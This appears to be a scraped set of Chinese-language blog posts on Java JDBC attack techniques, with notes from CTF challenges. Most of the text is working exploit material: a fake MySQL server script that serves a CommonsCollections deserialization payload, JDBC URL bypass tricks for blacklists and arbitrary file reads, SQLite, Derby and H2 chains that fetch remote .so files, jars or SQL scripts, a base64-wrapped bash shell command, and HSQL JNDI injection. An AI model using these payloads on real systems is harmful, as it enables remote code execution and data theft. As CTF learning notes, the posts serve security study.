使用规则：java -jar ysoserial [Gadget] [command] &gt; payload    file= r&#x27;D:\\1tmp\\cc5.bin&#x27;    if os.path.isfile(file):        with open(file, &#x27;rb&#x27;) as f:            payload_content = str(binascii.b2a_hex(f.read()),encoding=&#x27;utf-8&#x27;)        print(&quot;open successs&quot;)    else:        print(&quot;open false&quot;)        #calc        payload_content=&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;    return payload_content# 主要逻辑def run():    while 1:        conn, addr = sk.accept()        print(&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;.format(addr[0],addr[1]))        # 1.先发送第一个 问候报文        send_data(conn,greeting_data)        while True:            # 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok            receive_data(conn)            send_data(conn,response_ok_data)            #其他过程            data=receive_data(conn)            #查询一些配置信息,其中会发送自己的 版本号            if &quot;session.auto_increment_increment&quot; in data:                _payload=&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;                send_data(conn,_payload)                data=receive_data(conn)            elif &quot;show warnings&quot; in data:                _payload = &#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;                send_data(conn, _payload)                data = receive_data(conn)            if &quot;set names&quot; in data:                send_data(conn, response_ok_data)                data = receive_data(conn)            if &quot;set character_set_results&quot; in data:                send_data(conn, response_ok_data)                data = receive_data(conn)            if &quot;show session status&quot; in data:                mysql_data = &#x27;0100000102&#x27;                mysql_data += &#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;                mysql_data += &#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;                # 为什么我加了EOF Packet 就无法正常运行呢？？                # 获取payload                payload_content=get_payload_content()                # 计算payload长度                payload_length = str(hex(len(payload_content)//2)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(4)                payload_length_hex = payload_length[2:4] + payload_length[0:2]                # 计算数据包长度                data_len = str(hex(len(payload_content)//2 + 4)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(6)                data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]                mysql_data += data_len_hex + &#x27;04&#x27; + &#x27;fbfc&#x27;+ payload_length_hex                mysql_data += str(payload_content)                mysql_data += &#x27;07000005fe000022000100&#x27;                send_data(conn, mysql_data)                data = receive_data(conn)            if &quot;show warnings&quot; in data:                payload = &#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;                send_data(conn, payload)            breakif __name__ == &#x27;__main__&#x27;:    HOST =&#x27;127.0.0.1&#x27;    PORT = 3307    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)    sk.bind((HOST, PORT))    sk.listen(1)    print(&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;.format(HOST,PORT))    run()\n\n打开wireshrak，选择Adapter for loopback traffic capture。\n编写规则筛选mysql流量。由于我这里开在3307端口，所以需要写成ip.src &#x3D;&#x3D; 127.0.0.1 and tcp.dstport &#x3D;&#x3D; 3307。如果正常在3306端口，则直接输入mysql筛选即可。\n接着正常进行mysql jdbc 出网攻击。\npackage exp;import java.sql.Connection;import java.sql.DriverManager;import java.sql.SQLException;public class Exp &#123;    public static void main(String[] args) throws SQLException &#123;        String url = &quot;jdbc:mysql://127.0.0.1:3307/test?autoDeserialize=yes&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=root&amp;password=root&quot;;        String noOutBound = &quot;jdbc:mysql://127.0.0.1:3307/test?autoDeserialize=yes&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=root&amp;password=root&amp;socketFactory=com.mysql.jdbc.NamedPipeSocketFactory&amp;namedPipePath=YsoserialGadgetGenerate.bin&quot;;        String username = &quot;root&quot;;        String password = &quot;root&quot;;        try (Connection connection = DriverManager.getConnection(url, username, password)) &#123;            System.out.println(&quot;数据库连接成功!&quot;);        &#125; catch (SQLException e) &#123;            System.out.println(&quot;数据库连接失败!&quot;);            e.printStackTrace();        &#125;    &#125;&#125;\n\n成功捕获到流量：\n\n右击任意一个，选择追踪TCP流。并改成show data as 原始数据：\n\n复制所有的16进制数据，使用python解码并输出到pcap\nwith open(&quot;hex.txt&quot;, &quot;r&quot;) as f:    data = bytes.fromhex(f.read())    open(&quot;hex1.pcap&quot;, &quot;wb&quot;).write(data)\n\n得到的pcap文件就能够正常利用：\n\n踩坑记录现在回顾一下自己犯的错误。\n1、直接导出特定分组，而没有跟踪TCP流\n\n一开始就是按图片上的方式导出的，后来发现有问题。\n2、遇到max Packet Allowed报错\n按上面的方法导出后，尝试不出网攻击时，会报错max Packet Allowed，即包过大。当时以为要想办法把包缩小才行，没想到一开始导出的方式就错了。\n遗留问题https://github.com/Lotus6/JavaGadgetGenerator\n这个工具有一个MysqlPipe功能，但是我一直不知道怎么使用。\n我现在是在正常使用ysoserial模块的基础上，额外勾选了MysqlPipe，然后将导出的文件直接作为pcap使用，但是不对。在这个工具发了issue，知道的师傅麻烦回复一下我。\n作者回复：\n\n另外，m4x师傅文章后半部分，如何利用springboot临时文件也很值得看。\n出网打法拿上面那个fakeServer直接用就行。或者使用网上现成的工具。\nmysql jdbc 攻击还有一种读文件的打法，推荐使用 https://github.com/rmb122/rogue_mysql_server\n下面简单分析一下利用过程。\nExp受害端：\n利用前提：账号密码等参数可控，这样才能把那两个参数带上；连接的IP可控\nimport java.sql.*;public class Test &#123;    public static void main(String[] args) throws Exception &#123;        Class.forName(&quot;com.mysql.jdbc.Driver&quot;);        String jdbc_url = &quot;jdbc:mysql://127.0.0.1:3306/test123?&quot; +                &quot;autoDeserialize=true&quot; +                &quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;;        Connection con = DriverManager.getConnection(jdbc_url, &quot;root&quot;, &quot;root123&quot;);    &#125;&#125;\n\nfakeServer还是用上面的就行。\n原理当JDBC连接mysql时，会有几个内置的sql语句要执行。mysql的查询结果会以结果集的形式被JDBC接收。当结果集在JDBC上被处理时，会调用ObjectInputStream.readObject()进行反序列化，这个就是我们的入口。当我们可以控制JDBC去连接哪个mysql时，我们就可以让它连接我们的fake mysql，从而让返回的结果集为恶意数据，从而实现反序列化RCE。\n内置的，可利用的两条查询语句：\n\nSHOW SESSION STATUS\nSHOW COLLATION\n\n链子既然是反序列化，那肯定要有链子。链子的后半部分直接用CC链就行了。关键是入口类要怎么找。在这里，我们希望入口类最好是在JDBC连接时被自动调用，这样就可以自动readObject()。\n最终，可以找到com.mysql.cj.jdbc.result.ResultSetImpl，它的 getObject() 方法调用了 readObject() 方法：\n\nJDBC 通过 MySQL 数据库查询数据会返回一个结果集，将查询到的结果返回给程序，并将结果封装在 ResultSetImpl 这个类中。\n所以这个类不满足用户可控输入这一点，而且也不是会被自动调用的，所以我们应该要去找谁调用了 ResultSetImpl#getObject()。能够找到ResultSetUtil#resultSetToMap()：\n\n还是不满足条件，继续找，找到ServerStatusDiffInterceptor#populateMapWithSessionStatusValues：\n\n这里与mysql建立了连接，并且执行了我们上面说的可以利用的内置查询语句（查询的结果就是我们恶意伪造的数据），然而，还是没有实现自动调用，再找。找到ServerStatusDiffInterceptor#preProcess：\n\nServerStatusDiffInterceptor是一个拦截器，在 JDBC URL 中设定属性queryInterceptors为ServerStatusDiffInterceptor时，执行查询语句会调用拦截器的preProcess和postProcess方法，这是一个自动执行的过程，我们可以把它作为利用链头。这样链子就完整了。\n编写fakeServer这里要先用wireshark抓mysql的数据包，然后用python写脚本伪造整个流程，从建立连接到返回查询结果。\n可以参考：https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/\n调试在这里打断点：\n\n然后在resultSetToMap()步入，进入该方法：\n\n然后在第二个getObject处步入，进入该方法，之后一直步过，直到switch判断，应该会进入case:BLOB：\n\n图上写了几个关键点，最后就在readObject那边反序列化，后面的就是CC链的流程了。\n不同版本mysqlDriver的payload8.x反序列化数据：\n&quot;jdbc:mysql://127.0.0.1:3309/test?characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai&quot; +          &quot;&amp;autoDeserialize=true&quot; +      &quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;;\n\n任意文件读：\ntest?allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&amp;allowLoadLocalInfileInPath=/&amp;maxAllowedPacket=655360\n\n6.x属性名不同，queryInterceptors 换为 statementInterceptors\njdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\n\n5.1.29-5.1.40jdbc:mysql://x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true\n\n5.1.19-5.1.28jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true\n\n&gt;&#x3D;5.1.11jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\n\n&lt;&#x3D;5.1.10同5.1.11但是需要连接后执行查询\n绕过技巧前言这里提到的绕过方法很基础。就是大小写，URL编码，参数拼接，#注释等，感觉跟php里的绕过很像。\n具体代码参考https://github.com/Y4Sec-Team/mysql-jdbc-tricks\nfake-mysql可以使用4ra1n&#x2F;mysql-fake-server: MySQL Fake Server (纯Java实现，支持GUI版和命令行版，提供Dockerfile，支持多种常见JDBC利用)\n注意事项注释符差异8.0.x版本中，注释符为#，#后面的内容将被忽略。\n8版本在解析connectionString的时候，最后一步query会根据正则匹配将\n#后面的注释部分去掉。具体逻辑在下图中：\n\n\n可以看到#后面的内容不见了。\n在5.1.x版本中，不可以使用#来注释，但是可以在最后拼接&amp;x&#x3D;来注释。\n如：test?allowLoadLocalInfile&#x3D;true&amp;allowUrlInLocalInfile&#x3D;true&amp;maxAllowedPacket&#x3D;655360&amp;x&#x3D;\n参数名和参数值解析差异分析大小写绕过如果是这样检查的：\n那么可以直接大小写绕过。\n由于mysql里是这样判断参数值的：BooleanPropertyDefinition#parseObject()\n所以大小写不影响autoDeserialize的结果。\n另外，图片中看到YES和TRUE都可以，所以true被禁止时，不妨试试YES。还有，据说在低版本驱动中，1也可以。\nURL编码当检查通过URI类获取参数时，会自动解码URL，此时无法通过URL编码绕过，如下图：\n但是如果没有用URI类，那就可能存在URL编码绕过，如下图：\n另外，还有因为mysqlDriver版本产生的URL编码绕过。\n如果黑名单检测的代码是这样写的，很有可能会存在绕过的问题。\npublic static boolean isValidUrl(String url)&#123;  if(url.contains(&quot;allowLoadLocalInfile&quot;)||url.contains(&quot;allowUrlInLocalInfile&quot;)||url.contains(&quot;allowLoadLocalInfileInPath&quot;))&#123;    return false;  &#125;&#125;\n\n在8.0.x版本中，可以使用使用url编码的方式来对参数名和参数值进行编码。\n\njdbc:mysql:&#x2F;&#x2F;127.0.0.1:33060&#x2F;test?maxAllowedPacket&#x3D;655360&amp;characterEncoding&#x3D;utf-8&amp;allowUrlInLocalInfil%65&#x3D;%74%72%75%65# \nallowUrlInLocalInfile，maxAllowedPacket这些字段都是可以url编码绕过的。\n所以从原则上来讲用黑名单来过滤必须要先解码再进行匹配，不然可能会造成黑名单绕过的问题。\n在5.1.x版本中，只有参数值可以编码绕过，参数名是没办法编码绕过的。\n参数拼接这个很常用，就是在可控输入点输入一长串达到恶意拼接参数的效果，最后用#把后面的语句注释掉，跟sql注入有点像。\n值得一提的是，6.x.x版本的mysql需要在末尾用&amp;#来注释，否则会报错，而8.x.x版本的#或&amp;#都可以。\n报错如下：\n\n这里应该是6.x.x以&amp;来分割参数，所以并不会把#当作结束符，而是继续当作参数读取。最后就会导致参数格式不合法，从而产生报错。\naddress绕过第一次遇到是在suctf2025的ezjava\n通过jdbc连接时支持这种语法：jdbc:mysql:&#x2F;&#x2F;address&#x3D;(host&#x3D;myhost)(port&#x3D;1111)(key1&#x3D;value1)&#x2F;db\nhttps://dev.mysqlserver.cn/doc/connector-j/en/connector-j-reference-jdbc-url-format.html\n\n如果题目通过正则表达式匹配，可以通过这样的方法绕过，同时结合URL编码绕过关键字\n不出网的参数有点特别，要这样写：\nhttps://dev.mysqlserver.cn/doc/connector-j/en/connector-j-named-pipe.html\n\n不同版本connectJ也许不一样，以官方文档为准。\n参考微信公众平台\nJDBC Attack URL 绕过合集\nMySQL jdbc 反序列化分析 | Drunkbaby’s Blog\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"sqlite攻击","url":"/2025/05/05/sqlite%E6%94%BB%E5%87%BB/","content":"前言适用于load_extension打开的情况，比如：\n虽然这种情况现实中比较少。\n第一次遇到是在ciscn24_ezjava上\n分析首先你需要知道，sqlite是一个内存数据库，直接存储在本地，没有server，client一说。一个sqlite数据库就是一个文件，类似test.db。你可以随机新建一个db文件，然后创建sqlite时打开，这样之后产生的数据都会写在这个db文件上。sqlite无法跟mysql一样返回反序列化数据，只能通过加载so文件实现RCE\n漏洞利用流程：\n（前提：靶机能够执行select * from xxx，xxx可控）\n1、在vps上创建rce.c，编译成rce.so。通过JDBC连接(jdbc:sqlite::resource:http://10.195.247.79:7776/rce.so)，可以获取vps上的rce.so，并保存到/tmp/sqlite-jdbc-tmp-xxxx.db。其中xxxx的计算方式可知。\n2、新建exp.db，用navicat创建一个sqlite连接。新建一个查询，执行CREATE VIEW security as SELECT (SELECT load_extension(‘&#x2F;tmp&#x2F;sqlite-jdbc-tmp–xxxx.db’)); 这样会新建一个视图\n3、通过JDBC连接，可以获取vps上的exp.db，执行load_extension，加载之前的so文件，实现rce。即靶机最后执行select * from security\n如果能写文件的话，那就直接写so文件，然后加载就行了。最终的目的反正都是加载so文件。\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"Derby","url":"/2025/05/05/Derby/","content":"也是想办法执行初始化sql语句。不过这个不像h2一样，可以在URL里直接用INIT参数。这个需要配合JNDI+Druid。DruidDataSourceFactory里面有initConnectionSqls字段，并且可以在JNDI时设置，从而实现初始化sql。\n先写恶意jar包：\npackage com.example;import java.io.IOException;public class Runtime &#123;    public static void exec(String cmd) &#123;        try &#123;            java.lang.Runtime.getRuntime().exec(cmd);            System.out.println(&quot;cmd executed successfully&quot;);        &#125; catch (IOException e) &#123;            throw new RuntimeException(e);        &#125;    &#125;&#125;\n\njavac .\\src\\main\\java\\com\\example\\Runtime.java\njar -cvf Runtime.jar .src\\ .\npython -m http.server 8088\n然后写恶意ldap服务器：\npackage com.example.server;import com.example.solution.Tools17;import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import javax.naming.Reference;import javax.naming.StringRefAddr;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL;import java.util.ArrayList;import java.util.List;// jndi 绕过 jdk8u191 之前的攻击public class JNDILdapServer &#123;    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;    public static void main (String[] args) &#123;        String url = &quot;http://127.0.0.1:8088/poc.sql&quot;;        int port = 1388;        try &#123;            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);            config.setListenerConfigs(new InMemoryListenerConfig(                    &quot;listen&quot;,                    InetAddress.getByName(&quot;0.0.0.0&quot;),                    port,                    ServerSocketFactory.getDefault(),                    SocketFactory.getDefault(),                    (SSLSocketFactory) SSLSocketFactory.getDefault()));            config.addInMemoryOperationInterceptor(new OperationInterceptor());            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);            ds.startListening();        &#125;        catch ( Exception e ) &#123;            e.printStackTrace();        &#125;    &#125;    private static class OperationInterceptor extends InMemoryOperationInterceptor &#123;        private URL codebase;        /**         *         */        public OperationInterceptor ( ) &#123;//            this.codebase = cb;        &#125;        /**         * &#123;@inheritDoc&#125;         *         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)         */        @Override        public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123;            String base = result.getRequest().getBaseDN();            Entry e = new Entry(base);            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);            try &#123;                List&lt;String&gt; list = new ArrayList&lt;&gt;();                list.add(&quot;CALL SQLJ.INSTALL_JAR(&#x27;http://127.0.0.1:8088/Runtime.jar&#x27;, &#x27;APP.Runtime&#x27;, 0)&quot;);                list.add(&quot;CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;APP.Runtime&#x27;)&quot;);                //  list.add(&quot;CREATE PROCEDURE SALES.TOTAL_REVENUES() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;com.example.Runtime.exec&#x27;&quot;);//                list.add(&quot;CALL SALES.TOTAL_REVENUES()&quot;);                list.add(&quot;CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;com.example.Runtime.exec&#x27;&quot;);                list.add(&quot;CALL cmd(&#x27;calc&#x27;)&quot;);                Reference ref = new Reference(&quot;javax.sql.DataSource&quot;, &quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;, null);                ref.add(new StringRefAddr(&quot;url&quot;, &quot;jdbc:derby:mydb;create=true&quot;));                ref.add(new StringRefAddr(&quot;init&quot;, &quot;true&quot;));                ref.add(new StringRefAddr(&quot;initialSize&quot;, &quot;1&quot;));                ref.add(new StringRefAddr(&quot;initConnectionSqls&quot;, String.join(&quot;;&quot;, list)));                e.addAttribute(&quot;javaSerializedData&quot;, Tools17.ser(ref));                result.sendSearchEntry(e);                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));            &#125; catch (Exception exception) &#123;                exception.printStackTrace();            &#125;        &#125;        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123;            URL turl = new URL(this.codebase, this.codebase.getRef().replace(&#x27;.&#x27;, &#x27;/&#x27;).concat(&quot;.class&quot;));            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);            e.addAttribute(&quot;javaClassName&quot;, &quot;Exploit&quot;);            String cbstring = this.codebase.toString();            int refPos = cbstring.indexOf(&#x27;#&#x27;);            if ( refPos &gt; 0 ) &#123;                cbstring = cbstring.substring(0, refPos);            &#125;            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());            result.sendSearchEntry(e);            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));        &#125;    &#125;&#125;\n\n最后写poc：\npackage com.example.solution;import com.alibaba.druid.pool.DruidDataSource;import javax.naming.InitialContext;import javax.naming.NamingException;public class Poc &#123;    public static void main(String[] args) throws NamingException &#123;        InitialContext initialContext = new InitialContext();        String url = &quot;ldap://localhost:1388/anything&quot;;        Object lookup = initialContext.lookup(url);    &#125;&#125;","categories":["Java安全"],"tags":["Java安全"]},{"title":"h2sql","url":"/2025/05/05/h2sql/","content":"第一次用到是在ez_solon里面\n先简单给个EXP吧，之后再碰到再详细写\n找有getConnect的类，然后url这样写\nUnpooledDataSource dataSource = new UnpooledDataSource(&quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8000/h2.sql&#x27;&quot;, &quot;1diOt9&quot;, &quot;123456&quot;, &quot;org.database.Driver&quot;);\n\n.sql文件有多种写法\nScript引擎加载（jdk17失效）一是直接用JavaScript引擎加载执行：\nCREATE TABLE test (     id INT NOT NULL );CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS &#x27;//javascriptJava.type(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc&quot;);&#x27;;\n\n值得注意的是，这个方法在jdk17里会失效，因为Java17版本中JavaScript引擎(Nashorn)已经被删除。NCTF25的H2 Revenge就考了这个。\n定义函数执行二是定义一个函数执行：\nCREATE ALIAS SHELL AS $$ String shellexec(String cmd) throws java.io.IOException &#123; System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;;  &#125;$$;CALL SHELL(&#x27;bash -c &#123;echo,aaa&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;);\n\n值得注意的是如果只有jre而没有jdk，那么这个也会失效。因为这个方法需要jdk将函数编译后使用，如果只有jre就没办法编译了。\n调用public static 函数MyDataSource myDataSource = new MyDataSource(&quot;jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8000/poc.sql&#x27;&quot;, &quot;1diOt9&quot;, &quot;123456&quot;);CREATE ALIAS CLASS_FOR_NAME FOR &#x27;java.lang.Class.forName(java.lang.String)&#x27;;CREATE ALIAS NEW_INSTANCE FOR &#x27;org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])&#x27;;CREATE ALIAS UNESCAPE_VALUE FOR &#x27;javax.naming.ldap.Rdn.unescapeValue(java.lang.String)&#x27;;SET @url_str=&#x27;http://vps:port/h2_revenge_evil.xml&#x27;;SET @url_obj=UNESCAPE_VALUE(@url_str);SET @context_clazz=CLASS_FOR_NAME(&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;);SET @string_clazz=CLASS_FOR_NAME(&#x27;java.lang.String&#x27;);CALL NEW_INSTANCE(@context_clazz, ARRAY[@string_clazz], ARRAY[@url_obj]);\n\n\n\n写文件NCTF2024 Web方向题解-CSDN博客\nCALL FILE_WRITE(X’自己的so的十六进制编码’, ‘&#x2F;tmp&#x2F;exp.so’);\nCREATE ALIAS IF NOT EXISTS System_load FOR “java.lang.System.load(java.lang.String)”;\nCALL System_load(‘&#x2F;tmp&#x2F;exp.so’);\n参考H2 database漏洞复现 - Running_J - 博客园\n[JavaSec&#x2F;9.JDBC Attack&#x2F;h2&#x2F;index.md at main · Y4tacker&#x2F;JavaSec](https://github.com/Y4tacker/JavaSec/blob/main/9.JDBC Attack&#x2F;h2&#x2F;index.md)\n","categories":["Java安全"],"tags":["Java安全"]},{"title":"hsql","url":"/2025/05/05/hsql/","content":"直接看例子吧：\npublic class Test01 &#123;    public static void main(String[] args) throws ClassNotFoundException, SQLException &#123;        Class&lt;?&gt; aClass = Class.forName(&quot;org.hsqldb.jdbc.JDBCDriver&quot;);        String dburl = &quot;jdbc:hsqldb:mem&quot;;        Connection connection = DriverManager.getConnection(dburl, &quot;sa&quot;, &quot;&quot;);        connection.prepareStatement(&quot;CALL \\&quot;javax.naming.InitialContext.doLookup\\&quot;(&#x27;ldap://192.168.126.1:1389/0r1wr1&#x27;)&quot;).executeQuery();    &#125;&#125;\n\n漏洞原因是，hsql查询时可以调用任意public static 方法。上面的就是调用doLookup，实现JNDI注入。\n在高版本下，JNDI可能被禁用，这时候也可以通过重新覆盖字段来绕过：\nCALL java.lang.System.setProperty&quot;(&#x27;com.sun.jndi.ldap.object.trustURLCodebase&#x27;,&#x27;true&#x27;) + &quot;javax.naming.InitialContext.doLookup&quot;(&#x27;ldap://127.0.0.1:4444/pgesux&#x27;)\n\n当然，如果找到了类似deserialize等二次反序列化的函数，也可以直接用，payload类似：\nCALL &quot;java.lang.System.setProperty&quot;(&#x27;org.apache.commons.collections.enableUnsafeSerialization&#x27;,&#x27;true&#x27;) + 